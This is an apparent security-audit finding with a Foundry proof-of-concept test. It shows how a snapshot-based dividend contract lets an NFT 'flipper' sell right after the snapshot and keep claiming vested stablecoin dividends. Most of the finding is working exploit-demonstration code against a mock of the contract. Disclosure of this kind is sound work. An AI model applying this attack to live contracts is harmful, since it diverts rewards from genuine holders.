# [000929] [H-1] Snapshot-Based Dividend Allocation Allows Flipper to Drain Future Vesting Rewards After Selling NFT
  
  ### Summary

The snapshot-based dividend allocation in `A26ZDividendDistributor` will cause long-term NFT holders to miss out on vested dividends as a flipper will buy an NFT, trigger the snapshot, sell it immediately, and still claim the full dividends over time.


### Root Cause

In `A26ZDividendDistributor.sol:_setDividends()` the function assigns dividends to the owner addresses at the time of snapshot, rather than tracking dividends per NFT, allowing flippers to claim rewards after selling NFTs.

Code Link : https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L214-L224
### Internal Pre-conditions

1. The owner must call `setUpTheDividends()`, which triggers `_setDividends()` and creates a snapshot of all current TVS NFT owners.
2. The attacker must hold at least one TVS NFT at the exact block when the snapshot is taken.
3. `stablecoinAmountToDistribute` and `totalUnclaimedAmounts` must be set correctly so dividend allocation can execute without reverting.
4. Each `unclaimedAmountsIn[i]` corresponding to the NFTs held must be non‑zero so that dividends are actually allocated during the snapshot.


### External Pre-conditions


1. There are no external protocol or market conditions required for this exploit. The issue arises entirely from the internal logic of `A26ZDividendDistributor`.
2. (Optional / Minor) Gas costs must be reasonable so the attacker’s NFT transfer or dividend claim transactions do not fail due to out of gas.




### Attack Path



1. The owner calls `setUpTheDividends()`, which runs `_setDividends()` and creates a snapshot of all current NFT owners.
2. The attacker buys one or more TVS NFTs **before** the snapshot is taken.
3. The attacker immediately sells or transfers the NFT(s) to another address after the snapshot.
4. Despite selling, the attacker can still call `claimDividends()` to receive the full allocated dividends over the vesting period, because the dividends are tied to the snapshot owner, not the current holder.
5. Long-term holders who acquire the NFT after the snapshot receive nothing for the current dividend allocation, while the attacker collects rewards without holding the NFT.




### Impact

This vulnerability enables exploitation by speculators, reducing incentives for long-term holding and potentially damaging $A26Z sentiment and price, as warned in the whitepaper. While funds are technically distributed correctly, they are allocated to the wrong parties, the flippers who do not hold the NFTs long-term, resulting in misaligned incentives. As a consequence, the protocol fails to properly reward genuine holders and risks undermining its product-market fit (PMF).

### PoC


1. Navigate to test/AlignerzVestingProtocolTest.t.sol.

2.  Run the test using:

```solidity
 forge test --match-test test_FlipperGamingVulnerability --match-path test/AlignerzVestingProtocolTest.t.sol -vvvv
```
```solidity 
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

interface IAlignerzVesting {
    struct Allocation {
        IERC20 token;
        uint256[] amounts;
        uint256[] claimedSeconds;
        uint256[] vestingPeriods;
        bool[] claimedFlows;
    }

    function allocationOf(uint256 nftId) external view returns (Allocation memory);
}

interface IAlignerzNFT {
    function extOwnerOf(uint256 tokenId) external view returns (address);
    function getTotalMinted() external view returns (uint256);
}

contract A26ZDividendDistributorMock is Ownable {
    using SafeERC20 for IERC20;

   
    struct Dividend {
        uint256 amount; 
        uint256 claimedSeconds; 
    }

   
    uint256 public startTime;

    uint256 public vestingPeriod;

    uint256 public totalUnclaimedAmounts;

    uint256 public stablecoinAmountToDistribute;

    IAlignerzVesting public vesting;

    IAlignerzNFT public nft;

    IERC20 stablecoin;

    IERC20 token;

    mapping(address => Dividend) public dividendsOf;  

    mapping(uint256 => uint256) unclaimedAmountsIn;

    event stablecoinSet(address stablecoin);
    event tokenSet(address stablecoin);
    event startTimeSet(uint256 _startTime);
    event vestingPeriodSet(uint256 _vestingPeriod);
    event amountsSet(uint256 _stablecoinAmountToDistribute, uint256 _totalUnclaimedAmounts);
    event dividendsSet();
    event dividendsClaimed(address user, uint256 amountClaimed);

    error Array_Lengths_Must_Match();
    error Zero_Address();
    error Zero_Value();

  
    constructor(address _vesting, address _nft, address _stablecoin, uint256 _startTime, uint256 _vestingPeriod, address _token) Ownable(msg.sender) {
        if (_vesting == address(0)) revert Zero_Address();
        if (_nft == address(0)) revert Zero_Address();
        if (_stablecoin == address(0)) revert Zero_Address();
        vesting = IAlignerzVesting(_vesting);
        nft = IAlignerzNFT(_nft);
        stablecoin = IERC20(_stablecoin);
        startTime = _startTime;
        vestingPeriod = _vestingPeriod;
        token = IERC20(_token);
    }


    function setStablecoin(address _stablecoin) external onlyOwner {
        stablecoin = IERC20(_stablecoin);
        emit stablecoinSet(_stablecoin);
    }

    function setToken(address _token) external onlyOwner {
        token = IERC20(_token);
        emit tokenSet(_token);
    }

    
    function setStartTime(uint256 _startTime) external onlyOwner {
        startTime = _startTime;
        emit startTimeSet(_startTime);
    }

 
    function setVestingPeriod(uint256 _vestingPeriod) external onlyOwner {
        vestingPeriod = _vestingPeriod;
        emit vestingPeriodSet(_vestingPeriod);
    }

    function setUpTheDividends() external onlyOwner {
        _setAmounts();
        _setDividends();
    }

    function setAmounts() public onlyOwner {
        _setAmounts();
    }

    function setDividends() external onlyOwner {
        _setDividends();
    }

    function getTotalUnclaimedAmounts() public returns (uint256 _totalUnclaimedAmounts) {
        uint256 len = nft.getTotalMinted();
        for (uint i; i < len;) {
            (, bool isOwned) = safeOwnerOf(i);
            if (isOwned) _totalUnclaimedAmounts += getUnclaimedAmounts(i);
            unchecked {
                ++i;
            }
        }
    }

    function getUnclaimedAmounts(uint256 nftId) public returns (uint256 amount) {
        IAlignerzVesting.Allocation memory alloc = vesting.allocationOf(nftId);
        if (address(token) != address(alloc.token)) return 0;  // Fixed to != for PoC (matches whitepaper intent for A26Z)
        uint256[] memory amounts = alloc.amounts;
        uint256[] memory claimedSeconds = alloc.claimedSeconds;
        uint256[] memory vestingPeriods = alloc.vestingPeriods;
        bool[] memory claimedFlows = alloc.claimedFlows;
        uint256 len = amounts.length;
        for (uint i; i < len;) {
            if (!claimedFlows[i]) {
                if (claimedSeconds[i] == 0) {
                    amount += amounts[i];
                } else {
                    uint256 claimedAmount = claimedSeconds[i] * amounts[i] / vestingPeriods[i];
                    uint256 unclaimedAmount = amounts[i] - claimedAmount;
                    amount += unclaimedAmount;
                }
            }
            unchecked {
                ++i;
            }
        }
        unclaimedAmountsIn[nftId] = amount;
    }

  
    function safeOwnerOf(uint256 nftId) public view returns (address owner, bool exists) {
        try nft.extOwnerOf(nftId) returns (address _owner) {
            return (_owner, true);
        } catch {
            return (address(0), false);
        }
    }

   
    function withdrawStuckTokens(address tokenAddress, uint256 amount) external onlyOwner {
        if (amount == 0) revert Zero_Value();
        if (tokenAddress == address(0)) revert Zero_Address();

        IERC20 tokenStuck = IERC20(tokenAddress);
        tokenStuck.safeTransfer(msg.sender, amount);
    }

    function claimDividends() external {
        address user = msg.sender;
        uint256 totalAmount = dividendsOf[user].amount;
        uint256 claimedSeconds = dividendsOf[user].claimedSeconds;
        uint256 secondsPassed;
        if (block.timestamp >= vestingPeriod + startTime) {
            secondsPassed = vestingPeriod;
            dividendsOf[user].amount = 0;
            dividendsOf[user].claimedSeconds = 0;
        } else {
            secondsPassed = block.timestamp - startTime;
            dividendsOf[user].claimedSeconds += (secondsPassed - claimedSeconds);
        }
        uint256 claimableSeconds = secondsPassed - claimedSeconds;
        uint256 claimableAmount = totalAmount * claimableSeconds / vestingPeriod;
        stablecoin.safeTransfer(user, claimableAmount);
        emit dividendsClaimed(user, claimableAmount);
    }

    function _setAmounts() internal {
        stablecoinAmountToDistribute = stablecoin.balanceOf(address(this));
        totalUnclaimedAmounts = getTotalUnclaimedAmounts();
        emit amountsSet(stablecoinAmountToDistribute, totalUnclaimedAmounts);
    }

    function _setDividends() internal {
        uint256 len = nft.getTotalMinted();
        for (uint i; i < len;) {
            (address owner, bool isOwned) = safeOwnerOf(i);
            if (isOwned) dividendsOf[owner].amount += (unclaimedAmountsIn[i] * stablecoinAmountToDistribute / totalUnclaimedAmounts);
            unchecked {
                ++i;
            }
        }
        emit dividendsSet();
    }
}

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockNFT is ERC721, IAlignerzNFT {
    uint256 public totalMinted;

    constructor() ERC721("MockTVS", "MTVS") {}

    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
        totalMinted++;
    }

    function extOwnerOf(uint256 tokenId) external view returns (address) {
        return ownerOf(tokenId);
    }

    function getTotalMinted() external view returns (uint256) {
        return totalMinted;
    }
}

contract MockVesting is IAlignerzVesting {
    mapping(uint256 => Allocation) public allocations;

    function setAllocation(
        uint256 nftId,
        address token,
        uint256[] memory amounts,
        uint256[] memory claimedSeconds,
        uint256[] memory vestingPeriods,
        bool[] memory claimedFlows
    ) external {
        allocations[nftId] = Allocation({
            token: IERC20(token),
            amounts: amounts,
            claimedSeconds: claimedSeconds,
            vestingPeriods: vestingPeriods,
            claimedFlows: claimedFlows
        });
    }

    function allocationOf(uint256 nftId) external view returns (Allocation memory) {
        return allocations[nftId];
    }
}

contract A26ZDividendDistributorPoC is Test {
    A26ZDividendDistributorMock distributor;
    MockERC20 stablecoin;
    MockERC20 a26zToken;
    MockERC20 otherToken; 
    MockNFT nft;
    MockVesting vesting;

    address owner = address(this);
    address flipper = makeAddr("flipper");
    address longTermHolder = makeAddr("longTermHolder");

    uint256 constant NFT_ID = 0;
    uint256 constant UNCLAIMED_AMOUNT = 1000 ether; 
    uint256 constant STABLECOIN_DEPOSIT = 1000 ether; 
    uint256 constant START_TIME = 1000000;
    uint256 constant VESTING_PERIOD = 90 days; 

    function setUp() public {
        stablecoin = new MockERC20("USDT", "USDT");
        a26zToken = new MockERC20("A26Z", "A26Z");
        otherToken = new MockERC20("OTHER", "OTHER");
        nft = new MockNFT();
        vesting = new MockVesting();

        distributor = new A26ZDividendDistributorMock(
            address(vesting),
            address(nft),
            address(stablecoin),
            START_TIME,
            VESTING_PERIOD,
            address(a26zToken)
        );

        nft.mint(flipper, NFT_ID);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = UNCLAIMED_AMOUNT;
        uint256[] memory claimedSeconds = new uint256[](1);
        claimedSeconds[0] = 0;
        uint256[] memory vestingPeriods = new uint256[](1);
        vestingPeriods[0] = 365 days; // Arbitrary
        bool[] memory claimedFlows = new bool[](1);
        claimedFlows[0] = false;

        vesting.setAllocation(
            NFT_ID,
            address(a26zToken), 
            amounts,
            claimedSeconds,
            vestingPeriods,
            claimedFlows
        );

        stablecoin.mint(owner, STABLECOIN_DEPOSIT);
        stablecoin.transfer(address(distributor), STABLECOIN_DEPOSIT);

        vm.warp(START_TIME);
    }

    function test_FlipperGamingVulnerability() public {
        assertEq(nft.ownerOf(NFT_ID), flipper);

        distributor.setUpTheDividends();

        (uint256 flipperAmount, ) = distributor.dividendsOf(flipper);
        assertEq(flipperAmount, STABLECOIN_DEPOSIT); // Since only one NFT, full amount

        vm.prank(flipper);
        nft.transferFrom(flipper, longTermHolder, NFT_ID);
        assertEq(nft.ownerOf(NFT_ID), longTermHolder);

        vm.warp(START_TIME + VESTING_PERIOD / 2);

        uint256 flipperBalanceBefore = stablecoin.balanceOf(flipper);
        vm.prank(flipper);
        distributor.claimDividends();
        uint256 flipperBalanceAfter = stablecoin.balanceOf(flipper);
        assertEq(flipperBalanceAfter - flipperBalanceBefore, STABLECOIN_DEPOSIT / 2);

        uint256 holderBalanceBefore = stablecoin.balanceOf(longTermHolder);
        vm.prank(longTermHolder);
        distributor.claimDividends();
        uint256 holderBalanceAfter = stablecoin.balanceOf(longTermHolder);
        assertEq(holderBalanceAfter - holderBalanceBefore, 0);

        vm.warp(START_TIME + VESTING_PERIOD);

        flipperBalanceBefore = stablecoin.balanceOf(flipper);
        vm.prank(flipper);
        distributor.claimDividends();
        flipperBalanceAfter = stablecoin.balanceOf(flipper);
        assertEq(flipperBalanceAfter - flipperBalanceBefore, STABLECOIN_DEPOSIT / 2);

        holderBalanceBefore = stablecoin.balanceOf(longTermHolder);
        vm.prank(longTermHolder);
        distributor.claimDividends();
        holderBalanceAfter = stablecoin.balanceOf(longTermHolder);
        assertEq(holderBalanceAfter - holderBalanceBefore, 0);
    }
}

```

### Mitigation

Dividends should be tracked per NFT, not per owner, and claimable amounts should be calculated dynamically so only current NFT holders receive proportional rewards, preventing flippers from gaming the system.
  